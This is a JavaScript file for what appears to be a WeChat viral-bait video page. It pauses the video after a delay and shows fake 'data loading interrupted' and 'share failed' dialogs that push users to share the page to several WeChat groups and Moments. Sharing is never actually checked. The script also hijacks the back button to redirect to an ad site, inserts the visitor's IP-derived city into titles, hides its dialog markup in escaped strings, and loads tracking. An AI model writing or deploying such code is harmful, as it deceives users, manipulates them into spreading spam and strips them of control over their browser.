var video, player, playStatus = 'pending';
var til= $('#til').val();
var delayTime = parseInt($('#delay').val())||120 ;
var isOS=!!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var elId = 'mod_player_skin_0';
var vid = $('#vId').val();
var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
var elWidth = $("#js_content").width();
var alertTimes = 0;
var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
var shareATimes = 0;

var onVisibilityChange = function(){
	if (!document[hiddenProperty]) {
		if (delayTime < 9999) {
			shareATimes += 1;
			setTimeout(share_tip(shareATimes), 2000);
		}
	}
}

document.addEventListener(visibilityChangeEvent, onVisibilityChange);

$("#js_content").first().attr('id',elId);

function hh()
{
	history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
}

function jp() 
{
	location.href='http://n.yjkcd.com./xs.html'+"?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);
}


function playVideo(vid,elId,elWidth)
{
	//定义视频对象
	video = new tvp.VideoInfo();
	//向视频对象传入视频vid
	video.setVid(vid);
	//定义播放器对象
	player = new tvp.Player(elWidth, 200);
	//设置播放器初始化时加载的视频
	player.setCurVideo(video);
	//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
	if (sessionStorage.isAT && isOS) {
		document.addEventListener("WeixinJSBridgeReady", function() {
			player.play();
		}, false);
	}
	player.addParam("wmode","transparent");
	player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
	player.write(elId);
	player.onplaying=function(){
		if(!sessionStorage.pt){
			sessionStorage.pt=new Date().getTime();
		}
	};
}

function wxalert(msg, btn, callback)
{
	if (alertTimes == 0) {
		var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
		$("body").append(dialog)
	}
	alertTimes++;
	var d = $('#lly_dialog');
	d.show(200);
	d.find("#lly_dialog_msg").html(msg);
	d.find("#lly_dialog_btn").html(btn);

	d.find("#lly_dialog_btn").off('click').on('click', function() {
		d.hide(200);
		if (callback) {
			callback()
		}
	})
}

function show_tip() 
{
	wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
}

function jssdk() 
{
	if (!isOS) {
		if(!sessionStorage.isDT){
			sessionStorage.isDT=1;
			return location.reload();
		}
	}
	// sessionStorage.getItem('load');
	// location.reload();
	$("#fenxiang").show();
	show_tip();
}


function share_tip(share_app_times) 
{
	switch(share_app_times){
		case 1:
			wxalert('分享成功,请再分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可观看！', '好');
		break;
		case 2:
			wxalert('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！', '好');
		break;
		case 3:
			wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好');
		break;
		case 4:
			wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后一步!请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可!', '好')
		break;
		case 5:
			wxalert('<b style="font-size: 22px">分享成功！</b><br/>点击确定继续播放。', '确定', function() {
				delayTime = 99999;
				$("#fenxiang").hide();
				sessionStorage.removeItem("pt");
				player.onplaying=function(){};
				player.play();
				localStorage.setItem(vid,'s');
			})
		break;
		default :
		break;
	}
}

function jump(url) 
{
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

function chkwvs()
{
	if (!sessionStorage.isAT && isOS && wechatInfo && wechatInfo[1] >= "6.5.1") {
		//setTimeout("document.getElementById('sa').style.display='block';", 900);
	}
}

function winrs() {
	if (isOS) {
		player.onplaying=function(){
			if (!sessionStorage.isAT) {
				sessionStorage.isAT=1;
			}
		};
	}
}

function stopLoad() 
{
	try{
	 	if (!!(window.attachEvent && !window.opera)){ 
	    	document.execCommand("stop"); 
	    }
	    else{ 
	    	window.stop(); 
	    }
	}catch(e){}
}

$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
	document.title= remote_ip_info.city+document.title;
	$('header').text( remote_ip_info.city+$('header').text().trim('<city>').trim('</city>')); 
	$("li").each(function(){
		$(this).text((Math.random()>0.8?remote_ip_info.city:"")+$(this).text().trim('<city>').trim('</city>'))
	});
 	
 	var emojis = ['1f4a2','1f4a3','1f4a4','1f4a5','1f4a6','1f4aa','1f4ab'];
	var header = $('header').text();
	var ri = Math.floor(Math.random()*header.length);
	ri = (ri<3?(ri+3):ri);
	var ei = Math.floor(Math.random()*7);
	var title = [];
    for(var n in header){
        title.push(header[n]);
        if (n == ri)
        {
            title.push('<span class="emoji emoji'+emojis[ei] +'"></span>');
        }
   }
   $('header').html(title.join(''));

   $("li").each(function(){
   		var text = $(this).text();
		var title = [];
		title.push('<span class="emoji emoji1f4a5"></span>');
		title.push(text);
	   $(this).html(title.join(''));
   });
});

$("#pauseplay").height($("#js_content").height() - 10);

$('#pauseplay').on('click', function() 
{
	jssdk();
});

$('#fenxiang').on('click', function() {
	show_tip()
});

$('#like').on('click', function()
{
	var $icon = $(this).find('i');
	var $num = $(this).find('#likeNum');
	var num = 0;
	if(!$icon.hasClass('praised')){
		num = parseInt($num.html());
		if(isNaN(num)) {
			num = 0;
		}
		$num.html(++num);
		$icon.addClass("praised");
	} else {
		num = parseInt($num.html());
		num--;
		if(isNaN(num)) {
			num = 0;
		}
		$num.html(num);
		$icon.removeClass("praised");
	}
});

playVideo(vid,elId,elWidth);

if(playStatus == 'pending') {
	var isFirst = true;
	setInterval(function()
	{
		try {
			var currentTime = player.getCurTime();
			if(currentTime >= delayTime &&localStorage.getItem(vid)!='s') {
				$('#pauseplay').show();
				player.setPlaytime(delayTime-1);
				player.pause();
				player.cancelFullScreen();
		
				if(isFirst) {
					//stopLoad();
					jssdk();
				}
				isFirst = false;
			}
		} catch (e) {}
	}, 1000);
}

setTimeout(function(){
		$('.container-bg').height(window.screen.height);
        var h = $('#scroll').height();
        $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
        new IScroll('.container', {useTransform: false, click: true});
}, 500);

// var doc = $(document);
// var _touches_point1=0;
// var _touches_point2=0;

// addEventListener("touchstart",function(e)
// {
// 	_touches_point1 = e.touches[0].pageY;
// });

// addEventListener("touchmove",function(e) 
// {
// 	e.preventDefault();
// 	_touches_point2 = e.touches[0].pageY;
// 	if(doc.scrollTop()<=0 && _touches_point1<_touches_point2){
// 		if( $('#scroll').length <=0 ){
// 			$('body').prepend('<div id="scroll" style="text-align:center;background-color:#2d3132;color:#797d7e;height:0px;font-size:12px;overflow:hidden;"><p style="padding-top:12px;">此网页由 mp.weixin.qq.com 提供</p></div>');
// 		}
// 		$('#scroll').height((_touches_point2-_touches_point1)*0.35);
// 	} else {
// 		doc.scrollTop(doc.scrollTop()+((_touches_point1-_touches_point2)*0.4));
// 	}

// 	if(Math.ceil(doc.scrollTop()+$(window).height()) >= doc.height() || $('#_b_dp').length > 0){
// 		if($('#_b_dp').length <=0 ){
// 			$("#lly_dialog").after('<div id="_b_dp" style="text-align:center;color:#797d7e;height:0px;overflow:hidden;"></div>');
// 		}
// 		$('#_b_dp').height((_touches_point1-_touches_point2)*0.5);
// 	}
// });

// addEventListener("touchend",function(e) 
// {
// 	$('#scroll').slideUp('normal' , function(){
// 		$('#scroll').remove();
// 	});

// 	$('#_b_dp').slideUp('normal' , function(){
// 		$('#_b_dp').remove();
// 	});
// });

if (sessionStorage.isDT) {
	jssdk();
	sessionStorage.removeItem("isDT");
}

window.onhashchange=function()
{
	jp();
}

window.onload=function()
{
	if (sessionStorage.isAT) {
		chkwvs=function(){};
		sessionStorage.removeItem("isAT");
	}
	setTimeout('hh();', 100);
}

winrs();

window.onresize=window.onorientationchange=function()
{
	winrs();
}

var _hmt = _hmt || [];

(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?bb2185d4e579e8b861a248eb1e1036f9";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();

// var pars = {};

// pars.url = 'jiandingshu.cn';

// $.post('/inner/sdk.php', pars, 'json').then(function(dat) {
//     window.dat = dat;
//     wx.config({
//         debug: true,
//         appId: dat.appid,
//         timestamp: parseInt(dat.timestamp),
//         nonceStr: dat.nonce,
//         signature: dat.signature,
//         jsApiList: ['onMenuShareAppMessage', 'onMenuShareTimeline', 'hideAllNonBaseMenuItem', 'showMenuItems']
//     });

//     var sData = JSON.parse(unescape($('#page-config').html()));
//     var shareData = function(extend){
//         var obj = {
//             title: sData.title.replace(/<city>/g, dc),
//             link: sData.link,
//             imgUrl: sData.imgUrl,
//             desc: sData.desc.replace(/<city>/g, dc),
//             success: function() {
//                 if (num == 0){
//                     sData = dat.sData[num];
//                     num++;
//                     if(sData != 'close') {
//                         wx.onMenuShareAppMessage(shareData({}));
//                         App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u5931%u8D25%21%3C/b%3E%3Cbr%3E%u8BF7%u91CD%u65B0%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%uFF0C%u5373%u53EF%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E%u514D%u6D41%u91CF%u52A0%u901F%u89C2%u770B%3C/b%3E'));
//                         return;
//                     }
//                 }
//                 if (num == 1){
//                     sData = dat.sData[num];
//                     num++;
//                     if(sData != 'close') {
//                         wx.onMenuShareAppMessage(shareData({}));
//                         App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u5931%u8D25%21%3C/b%3E%3Cbr%3E%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%3B%22%3E%u6CE8%u610F%3A%20%u5206%u4EAB%u5230%u76F8%u540C%u7684%u7FA4%u4F1A%u5931%u8D25%21%3C/b%3E%3Cbr%3E%u8BF7%u91CD%u65B0%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%3B%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u7FA4%21'));
//                         return;
//                     }
//                 }
//                 if (num == 2){
//                     sData = dat.sData[num];
//                     num++;
//                     if(sData != 'close') {
//                         wx.onMenuShareAppMessage(shareData({}));
//                         App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u6210%u529F%21%3C/b%3E%3Cbr%3E%u8BF7%u7EE7%u7EED%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u7FA4%u5373%u53EF%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E%u514D%u6D41%u91CF%u52A0%u901F%u89C2%u770B%3C/b%3E%21'));
//                         return;
//                     }
//                 }
//                 if (num == 3){
//                     sData = dat.sData[num];
//                     num++;
//                     if(sData != 'close') {
//                         wx.hideAllNonBaseMenuItem();
//                         wx.showMenuItems({
//                             menuList: ['menuItem:share:timeline']
//                         });
//                         wx.onMenuShareTimeline(shareData({}));
//                         App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u6210%u529F%21%3C/b%3E%3Cbr%3E%u6700%u540E%u8BF7%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E%u670B%u53CB%u5708%3C/b%3E%u5373%u53EF%21'));
//                         return;
//                     }
//                 }
//                 if (num == 4){
//                     sData = dat.sData[num];
//                     num++;
//                     if(sData != 'close') {
//                         wx.hideAllNonBaseMenuItem();
//                         wx.showMenuItems({
//                             menuList: ['menuItem:share:timeline']
//                         });
//                         wx.onMenuShareTimeline(shareData({}));
//                         App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3Bcolor%3Ared%22%3E%u5206%u4EAB%u5931%u8D25%3C/b%3E%3Cbr%3E%u518D%u5206%u4EAB%u4E00%u6B21%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E%u670B%u53CB%u5708%3C/b%3E%u5373%u53EF%u89C2%u770B%21'));
//                         return;
//                     }
//                 }
//                 sessionStorage.setItem('s_' + config.vid, 'c');
				
//                 location.reload();
				 
//             },
//             cancel: function(){
//             }
//         };
//         return $.extend(obj, extend);
//     };

//     wx.ready(function(){
//         var sf = shareData({});
//         delete sf.desc;
//         wx.onMenuShareTimeline(sf);
//         wx.onMenuShareAppMessage(shareData({}));
//         wx.hideAllNonBaseMenuItem();
//         wx.showMenuItems({
//             menuList: ['menuItem:share:appMessage']
//         });
        
        
//         if(playStatus == 'pending') {
//             var isFirst = true;
//             setInterval(function(){
//                 try {
//                     var currentTime = player.getCurTime();
//                     if(currentTime >= delayTime) {
//                         $('#pauseplay').show();
//                         player.callCBEvent('pause');
//                         sessionStorage.setItem('s_' + vid, 's');
// 						sessionStorage.setItem('load', true);
//                         if(isFirst) {
//                             location.reload();
//                         } else {
//                             isFirst = false;
//                         }
//                     }
//                 } catch (e) {

//                 }
//             }, 1000);
//         }
//     });
// });
